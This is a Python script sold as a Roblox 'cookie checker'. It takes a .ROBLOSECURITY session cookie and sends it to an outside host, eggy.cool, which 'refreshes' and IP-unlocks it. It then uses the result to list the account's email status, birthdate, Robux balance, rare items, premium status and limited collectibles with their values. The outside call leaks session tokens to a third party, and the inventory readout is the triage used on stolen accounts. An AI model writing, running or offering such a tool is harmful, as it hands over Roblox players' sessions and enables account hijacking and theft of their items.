import requests
from colorama import Fore, Style, init
import os
import time
def title():
  print(f"{Style.BRIGHT}{Fore.MAGENTA}|‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|")
  print(f"{Fore.MAGENTA}|   {Style.BRIGHT}{Fore.GREEN}Cookie Checker  {Fore.MAGENTA}|")
  print(f"{Fore.MAGENTA}|  {Style.BRIGHT}{Fore.BLUE}Made by {Fore.YELLOW}I458I    {Fore.MAGENTA}|")
  print(f"{Fore.MAGENTA}|___________________|\n")
title()
init(autoreset=True)
print(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Enter '?' for help/info.")
cookie = input(f"{Style.BRIGHT}{Fore.GREEN}Enter Cookie:{Fore.BLUE}").strip()
os.system("cls")
title()
def help():
  print("Paste the .ROBLOSECURITY when prompted.\n\nMade by I458I, Feel free to DM me for help.\nThis will close in 15 seconds")
  time.sleep(15)
  quit()
if cookie == "?":help()
print(f"{Style.BRIGHT}{Fore.YELLOW}Refreshing Cookie...")
IPlock = requests.get(f"https://eggy.cool/refresh/v2.7.php?cookie=" + cookie).text.strip()
try:
 os.system("cls")
 title()
 r=requests.get("https://accountsettings.roblox.com/v1/email", cookies={'.ROBLOSECURITY': IPlock}).json() #EMAIL VERIFICATION
 if "verified" in r:
    print(f"{Style.BRIGHT}{Fore.GREEN}Email:{Fore.BLUE} Verified")
 else:print(f'{Style.BRIGHT}{Fore.GREEN}Email:{Fore.RED} Unverified')
 r=requests.get("https://users.roblox.com/v1/birthdate", cookies={'.ROBLOSECURITY': IPlock}).json() #BIRTH DATE
 BIRTH = f"{r['birthYear']}-{r['birthMonth']}-{r['birthDay']}"
 print(f"{Style.BRIGHT}{Fore.GREEN}Birthdate: {Fore.BLUE}{BIRTH}")
 r=requests.get("https://users.roblox.com/v1/users/authenticated", cookies={'.ROBLOSECURITY': IPlock}).json() #USER ID
 ID = r["id"]
 NAME = r["name"]
 print(f"{Style.BRIGHT}{Fore.GREEN}URL: {Fore.BLUE}https://www.roblox.com/users/{ID}/profile")
 print(f"{Style.BRIGHT}{Fore.GREEN}Username: {Fore.BLUE}{NAME}")
 r=requests.get("https://economy.roblox.com/v1/user/currency", cookies={'.ROBLOSECURITY': IPlock}).json() #ROBUX
 ROBUX = r["robux"]
 x = "{:,}".format(ROBUX)
 print(f"{Style.BRIGHT}{Fore.GREEN}Robux: {Fore.YELLOW}{x}$")
 x=requests.get(f"https://catalog.roblox.com/v1/users/{ID}/bundles/1?limit=100&nextPageCursor=&sortOrder=Desc", cookies={'.ROBLOSECURITY': IPlock}).json() #Bundle Checker
 headless = [201]
 korblox = [192]
 head = 0
 korblx = 0
 for item in x["data"]:
   y = item["id"]
   if any(check_id == y for check_id in headless):
     print(f"{Style.BRIGHT}{Fore.GREEN}Headless: {Fore.BLUE}True")
     head = 1
   if any(check_id == y for check_id in korblox):
     print(f"{Style.BRIGHT}{Fore.GREEN}Korblox: {Fore.BLUE}True")
     korblx = 1
 if head == 0:
   print(f"{Style.BRIGHT}{Fore.GREEN}Headless: {Fore.RED}False")
 if korblx == 0:
   print(f"{Style.BRIGHT}{Fore.GREEN}Korblox: {Fore.RED}False")
 r=requests.get(f"https://premiumfeatures.roblox.com/v1/users/{ID}/validate-membership", cookies={'.ROBLOSECURITY': IPlock}).json() #PREMIUM CHECKER
 if bool(r):PREMIUM = print(f"{Style.BRIGHT}{Fore.GREEN}Premium:{Fore.BLUE} True")
 else:print(f"{Style.BRIGHT}{Fore.GREEN}Premium:{Fore.RED} False")
 r=requests.get(f"https://inventory.roblox.com/v1/users/{ID}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100", cookies={'.ROBLOSECURITY': IPlock}).json() #Limiteds Checker
 if r['data'] == []:print(f"{Style.BRIGHT}{Fore.GREEN}Limiteds: {Fore.RED}None")
 else:
  print(f"{Style.BRIGHT}{Fore.GREEN}Limiteds:")
  collectibles = r["data"]
  for collectible in collectibles:
   name = collectible["name"]
   value = collectible["recentAveragePrice"]
   x = "{:,}".format(value)
   print(f"{Style.BRIGHT}{Fore.BLUE}{name}: {Fore.YELLOW}{x}$")
 print(f"{Style.BRIGHT}{Fore.GREEN}\nRefreshed Cookie:\n{Fore.BLUE}_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{IPlock}")
 print(Style.BRIGHT+ Fore.LIGHTBLACK_EX + "\nCRTL + CLICK. To follow links.")
 input(Style.BRIGHT+ Fore.RED + "Press enter to exit.")
except:
  os.system("cls")
  title()
  print(f"{Style.BRIGHT}{Fore.RED}Invalid Cookie")
  input(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Press enter to exit.")
